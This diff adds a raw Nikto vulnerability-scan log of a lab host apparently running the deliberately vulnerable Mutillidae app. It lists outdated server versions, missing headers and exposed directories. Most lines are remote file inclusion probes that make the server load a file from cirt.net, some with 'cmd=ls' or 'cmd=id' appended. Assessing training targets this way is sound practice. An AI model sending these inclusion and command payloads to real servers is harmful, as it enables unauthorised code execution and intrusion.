@@ -1,0 +1,159 @@
+- Nikto v2.6.0/
++ Target Host: meta2
++ Target Port: 80
++ GET /mutillidae/: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.
++ GET /mutillidae/: Uncommon header(s) 'logged-in-user' found, with contents: .
++ GET /mutillidae/: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies: 
++ GET /mutillidae/robots.txt: Server may leak inodes via ETags, header found with file /mutillidae/robots.txt, inode: 12605124, size: 160, mtime: Tue May 10 23:00:04 2011. See: CVE-2003-1418: 
++ GET /robots.txt: contains 6 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt: 
++ HEAD /mutillidae: PHP/5.2.4-2ubuntu5.10 appears to be outdated (current is at least 8.5.1).
++ HEAD /mutillidae: Apache/2.2.8 appears to be outdated (current is at least 2.4.66).
++ GET /mutillidae/images/: Directory indexing found.
++ GET /mutillidae/: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security: 
++ GET /mutillidae/: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP: 
++ GET /mutillidae/: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy: 
++ GET /mutillidae/: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy: 
++ GET /mutillidae/: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options: 
++ GET /mutillidae/index: Uncommon header(s) 'tcn' found, with contents: list.
++ GET /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275: 
++ IVTNDDSN /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ DEBUG /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017: 
++ TRACE /: HTTP TRACE method is active and replies which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing: 
++ GET /mutillidae/index.php: PHP include error may indicate local or remote file inclusion is possible.
++ GET /mutillidae/phpinfo.php: Output from the phpinfo() function was found.
++ GET /mutillidae/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP Easter Eggs reveals potentially sensitive information via HTTP requests that contain specific QUERY strings. See: https://labs.detectify.com/writeups/do-you-dare-to-show-your-php-easter-egg/: 
++ GET /mutillidae/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP Easter Egg reveals potentially sensitive information via HTTP requests that contain specific QUERY strings. See: https://labs.detectify.com/writeups/do-you-dare-to-show-your-php-easter-egg/: 
++ GET /mutillidae/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP Easter Egg reveals potentially sensitive information via HTTP requests that contain specific QUERY strings. See: https://labs.detectify.com/writeups/do-you-dare-to-show-your-php-easter-egg/: 
++ GET /mutillidae/?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP Easter Egg reveals potentially sensitive information via HTTP requests that contain specific QUERY strings. See: https://labs.detectify.com/writeups/do-you-dare-to-show-your-php-easter-egg/: 
++ GET /mutillidae/home/: This might be interesting.
++ GET /mutillidae/includes/: Directory indexing found.
++ GET /mutillidae/includes/: This might be interesting.
++ GET /mutillidae/login/: This might be interesting.
++ GET /mutillidae/passwords/: Directory indexing found.
++ GET /mutillidae/passwords/: This might be interesting.
++ GET /mutillidae/register/: This might be interesting.
++ GET /mutillidae/phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552: 
++ GET /mutillidae/index.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552: 
++ GET /mutillidae/styles/: Directory indexing found.
++ GET /mutillidae/config.inc: DotBr 0.1 configuration file includes usernames and passwords. See: OSVDB-5092: 
++ GET /mutillidae/?_CONFIG[files][functions_page]=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/?npage=-1&content_dir=https://cirt.net/public/rfiinc.txt%00&cmd=ls: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/?npage=1&content_dir=https://cirt.net/public/rfiinc.txt%00&cmd=ls: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/?show=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?1=lol&PAGES[lol]=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?AML_opensite=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?AMV_openconfig=1&AMV_serverpath=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?CONFIG[MWCHAT_Libs]=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?ConfigDir=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?DIR_PLUGINS=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?G_JGALL[inc_path]=https://cirt.net/public/rfiinc.txt%00: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?HomeDir=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?Lang=AR&Page=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?Madoa=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?RP_PATH=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid=1&GLOBALS=&mosConfig_absolute_path=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?abg_path=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?abs_path=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?abs_path=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?adduser=true&lang=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?adodb=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?ads_file=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?arquivo=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?back=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?base==https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?basePath=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?bibtexrootrel=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?blog_dc_path=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?blog_theme=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?body=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?class_path=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?classified_path=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?cms=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?config[\"sipssys\"]=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?config[root_ordner]=https://cirt.net/public/rfiinc.txt?&cmd=id: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?config[root_ordner]=https://cirt.net/public/rfiinc.txt?cmd=id: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?config_atkroot=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?configuration=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?custom_admin_path=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?dateiPfad=https://cirt.net/public/rfiinc.txt?&cmd=ls: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?de=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?dept=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?do=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?exec=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?ext=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?faq_path=https://cirt.net/public/rfiinc.txt?&cmd=id: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?file_name[]=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?file_path=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?fileloc=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?from=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?func=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?function=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?function=custom&custom=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?gOo=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?gen=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?get=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?home_name=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?ilang=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?inc_dir=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?inc_dir=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?includeDir=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?includeFooter=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?includesdir=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?insPath=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?lang=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?language=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?language=en&main_page=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?lizge=https://cirt.net/public/rfiinc.txt?&cmd=ls: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?lng=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?load=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?loadpage=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?main_tabid=1&main_content=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?may=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?middle=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?mode=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?mode=https://cirt.net/public/rfiinc.txt?&cmd=: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?modpath=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?module=PostWrap&page=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?mosConfig_absolute_path=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?news7[\"functions\"]=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?news_include_path=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?open=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?option=com_custompages&cpage=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?page=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?page=https://cirt.net/public/rfiinc.txt%00: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?page=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?pagehttps://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?page[path]=https://cirt.net/public/rfiinc.txt?&cmd=ls: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?pagename=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?pager=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?pagina=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?path_to_folder=https://cirt.net/public/rfiinc.txt?cmd=id: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?pg=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?pg=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?phpbb_root_path=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?plugin=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?principal=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?proMod=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?proMod=https://cirt.net/public/rfiinc.txt?cmd: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?project=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?repinc=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?root_prefix=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?root_prefix=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?section=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?site=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?site_path=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?styl[top]=https://cirt.net/public/rfiinc.txt??: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?template=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?templates_dir=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?theme=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?themepath=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?themesdir=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?this_path=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?txt=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?up=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?url=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?w=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/index.php?way=https://cirt.net/public/rfiinc.txt??????????????: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2: 
++ GET /mutillidae/login.php: Admin login page/section found.
+- Nikto v2.6.0/
